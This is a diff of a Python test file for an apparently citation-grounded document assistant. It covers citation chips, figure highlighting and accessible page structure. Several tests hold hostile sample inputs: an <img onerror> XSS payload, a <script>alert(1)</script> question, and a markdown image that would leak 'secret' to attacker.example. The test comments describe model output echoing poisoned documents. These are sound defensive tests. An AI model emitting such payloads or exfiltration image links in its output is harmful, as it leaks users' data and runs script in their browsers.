@@ -14,8 +14,8 @@ from citara.config import Paths, RetrievalSettings, Settings, UiSettings
 from citara.generation.citations import build_citations
 from citara.generation.models import GeneratedAnswer
 from citara.retrieval.models import RetrievedChunk
-from citara.ui import health, presenters
-from citara.ui.corpus import load_corpus
+from citara.ui import health, markup, presenters
+from citara.ui.corpus import Corpus, CorpusDocument, load_corpus
 
 UI = UiSettings()
 
@@ -53,42 +53,44 @@ def generated(text: str, scores: tuple[float, ...] = (0.92,), **fields: object) 
 
 
 def test_markers_become_chips_that_show_the_page() -> None:
-    """The page is on the chip itself: a phone has no hover to reveal a tooltip."""
-    rendered = presenters.render_answer_html(generated("Evacuate low-lying areas [1]."))
-    assert '<span class="cite-chip" title="NDRP 2019, p. 47">1 · p. 47</span>' in rendered
+    """A citation is a <cite>: the page is on the chip, because a phone has no hover."""
+    rendered = markup.answer_body(generated("Evacuate low-lying areas [1]."))
+    assert '<cite class="cite-chip" title="NDRP 2019, p. 47"' in rendered
+    assert ">1 · p. 47</cite>" in rendered
+    assert 'aria-label="Source 1: NDRP 2019, p. 47"' in rendered  # terse chip, spoken in full
     assert "[1]" not in rendered
 
 
 def test_a_marker_without_evidence_is_flagged_not_dropped() -> None:
-    rendered = presenters.render_answer_html(generated("Boats are pre-positioned [7]."))
+    rendered = markup.answer_body(generated("Boats are pre-positioned [7]."))
     assert "cite-invalid" in rendered
-    assert "7?" in rendered
+    assert "7?</cite>" in rendered
+    assert "does not match any retrieved source" in rendered
 
 
 def test_html_in_model_output_is_never_rendered() -> None:
     """Model output can echo a poisoned document; it must not become markup."""
-    rendered = presenters.render_answer_html(
-        generated('<img src=x onerror="alert(1)"> Evacuate now [1].')
-    )
+    rendered = markup.answer_body(generated('<img src=x onerror="alert(1)"> Evacuate now [1].'))
     assert "<img" not in rendered
     assert "&lt;img" in rendered
-    assert '<span class="cite-chip"' in rendered  # the chips are still real markup
+    assert '<cite class="cite-chip"' in rendered  # the citations are still real markup
 
 
 def test_markdown_images_cannot_send_requests() -> None:
     """Rendering ![](https://attacker/?q=...) would exfiltrate without a click."""
     text = "Evacuate [1]. ![status](https://attacker.example/log?q=secret)"
-    rendered = presenters.render_answer_html(generated(text))
+    rendered = markup.answer_body(generated(text))
     assert "attacker.example" not in rendered
     assert "status" in rendered  # the alt text survives
-    assert "attacker.example" not in presenters.safe_markdown(text)
+    assert "attacker.example" not in markup.markdown(text)
 
 
 def test_citation_titles_are_escaped_inside_the_tooltip() -> None:
     answer = generated("Claim [1].")
     answer.citations[0].citation = 'Plan "2026" <draft>'
-    rendered = presenters.render_answer_html(answer)
+    rendered = markup.answer_body(answer)
     assert 'title="Plan &quot;2026&quot; &lt;draft&gt;"' in rendered
+    assert "<draft>" not in rendered
 
 
 def test_page_ranges_read_naturally() -> None:
@@ -384,10 +386,9 @@ def test_package_exports_still_resolve_on_demand() -> None:
 
 def test_a_full_stop_stays_with_its_chip() -> None:
     """Seen at phone width: a wrapped chip stranded its full stop alone on the next line."""
-    rendered = presenters.render_answer_html(generated("Limit outdoor work [1]. Rest often [1]"))
-    assert '<span class="cite-tail"><span class="cite-chip"' in rendered
-    assert "</span>.</span>" in rendered
-    assert rendered.endswith("1 · p. 47</span>")  # no punctuation, no wrapper
+    rendered = markup.answer_body(generated("Limit outdoor work [1]. Rest often [1]"))
+    assert '<span class="cite-tail"><cite class="cite-chip"' in rendered
+    assert "</cite>.</span>" in rendered
 
 
 # --- figures and the mark (feature 60) -----------------------------------------------
@@ -405,7 +406,7 @@ def test_a_full_stop_stays_with_its_chip() -> None:
 )
 def test_figures_are_marked_for_the_reader(text: str) -> None:
     """The number is what an officer came for, and what they will check against the page."""
-    assert '<span class="figure">' in presenters.render_answer_html(generated(text))
+    assert '<mark class="figure">' in markup.answer_body(generated(text))
 
 
 @pytest.mark.parametrize(
@@ -418,17 +419,17 @@ def test_figures_are_marked_for_the_reader(text: str) -> None:
 )
 def test_small_bare_numbers_are_left_alone(text: str) -> None:
     """Marking every digit would be noise, and a highlight that means everything means nothing."""
-    assert "figure" not in presenters.render_answer_html(generated(text))
+    assert "figure" not in markup.answer_body(generated(text))
 
 
 def test_a_citation_marker_is_never_read_as_a_figure() -> None:
     answer = generated("Damages were 35,000 [1].", scores=(0.9,))
     answer.citations[0].page_start = 1000
     answer.citations[0].page_end = 1200
-    rendered = presenters.render_answer_html(answer)
-    assert '<span class="figure">35,000</span>' in rendered
-    assert 'title="NDRP 2019, p. 47">1 · pp. 1000-1200</span>' in rendered
-    assert '<span class="figure">1,000' not in rendered  # the page number stays in its chip
+    rendered = markup.answer_body(answer)
+    assert '<mark class="figure">35,000</mark>' in rendered
+    assert ">1 · pp. 1000-1200</cite>" in rendered
+    assert '<mark class="figure">1,000' not in rendered  # the page number stays in its chip
 
 
 def test_the_mark_is_inline_svg_that_takes_the_colour_around_it() -> None:
@@ -439,3 +440,109 @@ def test_the_mark_is_inline_svg_that_takes_the_colour_around_it() -> None:
     assert "CITARA" in lockup
     assert "NDMA doctrine assistant" in lockup
     assert 'width="16"' in logo.mark(size=16)
+
+
+# --- document structure (feature 60) -------------------------------------------------
+
+
+def a_turn(answer: GeneratedAnswer, question: str = "How many died?", scope: str = "") -> str:
+    turn = presenters.Turn(
+        question=question,
+        answer=answer,
+        asked_at=datetime(2026, 9, 25, 9, 0, tzinfo=UTC),
+        scope=scope,
+    )
+    return markup.turn_article(turn, Settings(_env_file=None), 1)  # type: ignore[call-arg]
+
+
+def test_an_exchange_is_an_article_headed_by_its_question() -> None:
+    """A screen reader moves by heading and by article; div soup offers neither."""
+    html = a_turn(generated("Evacuate low-lying areas [1]."))
+
+    assert '<article class="turn" aria-labelledby="q-1">' in html
+    assert '<h2 class="question" id="q-1">How many died?</h2>' in html
+    assert '<h3 class="section-label" id="a-1">Answer</h3>' in html
+    assert '<h3 class="section-label" id="e-1">Evidence</h3>' in html
+    assert '<h3 class="section-label" id="s-1">Sources' in html
+    # Each part is a region named by its own heading.
+    assert '<section class="turn-section" aria-labelledby="a-1">' in html
+
+
+def test_the_question_cannot_inject_markup() -> None:
+    html = a_turn(generated("Answer [1]."), question="<script>alert(1)</script> & more")
+    assert "<script>" not in html
+    assert "&lt;script&gt;" in html
+
+
+def test_sources_open_without_javascript() -> None:
+    """<details> is the element for a panel that opens; a div plus JS is not."""
+    html = a_turn(generated("Evacuate [1].", scores=(0.9, 0.5)))
+
+    assert '<details class="sources-panel"><summary>Show the passages</summary>' in html
+    assert '<ol class="source-list">' in html
+    assert '<blockquote class="passage">' in html
+    assert "<cite>NDRP 2019, p. 47</cite>" in html
+    assert '<data class="score" value="0.9000">relevance 0.90</data>' in html
+
+
+def test_a_degraded_answer_opens_its_sources() -> None:
+    answer = generated("", scores=(0.9,), mode="degraded", reason="providers_unavailable")
+    answer.text = "Answer generation is unavailable right now.\n\n**NDRP 2019, p. 47**\n\nPassage."
+    html = a_turn(answer)
+
+    assert '<details class="sources-panel" open>' in html
+    assert "Degraded</h3>" in html
+    assert '<section class="turn-section" aria-labelledby="a-1">' not in html  # nothing generated
+
+
+def test_a_refusal_is_a_named_section_not_an_answer() -> None:
+    html = a_turn(
+        GeneratedAnswer(text="I could not find this.", mode="refused", reason="no_evidence")
+    )
+
+    assert "Refused</h3>" in html
+    assert "No supporting evidence in the indexed documents" in html
+    assert "answer-body" not in html
+
+
+def test_a_finished_answer_announces_itself_once() -> None:
+    """Streaming into a live region makes a screen reader stutter through half-words."""
+    html = a_turn(generated("Evacuate [1]."))
+    assert (
+        '<p class="sr-only" role="status">Answer ready, 1 source cited, evidence high.</p>' in html
+    )
+
+    streaming = markup.streaming_article("How many died?", "Evacuate low")
+    assert 'aria-busy="true"' in streaming
+    assert 'role="status"' not in streaming  # silent until it is finished
+
+
+def test_the_scope_of_a_filtered_search_is_recorded_on_the_turn() -> None:
+    assert "Searched: NDRP 2019" in a_turn(generated("x [1]."), scope="NDRP 2019")
+
+
+def test_the_page_has_one_h1_and_a_footer_that_says_what_this_is() -> None:
+    header = markup.header(
+        "Citation-grounded answers", "Not an official NDMA system.", "<svg></svg>"
+    )
+    assert header.count("<h1") == 1
+    assert "CITARA</h1>" in header
+    assert "Not an official NDMA system." in header
+
+    corpus = Corpus(
+        documents=[CorpusDocument("ndrp", "NDRP 2019", 2019, 110, 49, 50, "61 scanned pages")]
+    )
+    footer = markup.footer(corpus, "2026-09-18T16:57:38Z", "https://github.com/x/y")
+    assert footer.startswith("<footer")
+    assert 'rel="noopener noreferrer"' in footer  # a target=_blank link without this leaks
+    assert '<time datetime="2026-09-18T16:57:38Z">2026-09-18</time>' in footer
+    assert "49 of 110 pages searchable" in footer
+
+
+def test_document_text_keeps_its_tables_and_loses_its_scripts() -> None:
+    rendered = markup.markdown(
+        "| year | deaths |\n|---|---|\n| 1935 | 35,000 |\n\n<script>x</script>"
+    )
+    assert "<table>" in rendered and "<th>deaths</th>" in rendered
+    assert "<script>" not in rendered
+    assert "&lt;script&gt;" in rendered
